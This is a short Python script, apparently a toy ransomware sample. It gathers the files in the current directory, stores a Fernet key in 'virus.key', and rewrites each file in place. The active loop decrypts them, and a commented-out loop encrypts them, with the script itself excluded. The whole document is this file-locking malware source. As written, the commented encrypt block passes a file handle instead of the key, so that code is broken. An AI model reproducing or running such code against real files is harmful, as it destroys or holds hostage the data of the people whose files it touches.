import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
  if file == "security.py" or file == "virus.key":
    continue
  if os.path.isfile(file):
    files.append(file)

print(files)
if os.path.exists('virus.key'):
  pass
else:
  key = Fernet.generate_key()
  with open("virus.key", 'wb') as thekey:
    thekey.write(key)

with open("virus.key", "rb") as key:
  secretkey = key.read()

for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_decrpted = Fernet(secretkey).decrypt(contents)
  with open(file, "wb") as thefile:
    thefile.write(contents_decrpted)

# for file in files:
#   with open(file, "rb") as thefile:
#     contents = thefile.read()
#   contents_encrpted = Fernet(key).encrypt(contents)
#   with open(file, "wb") as thefile:
#     thefile.write(contents_encrpted)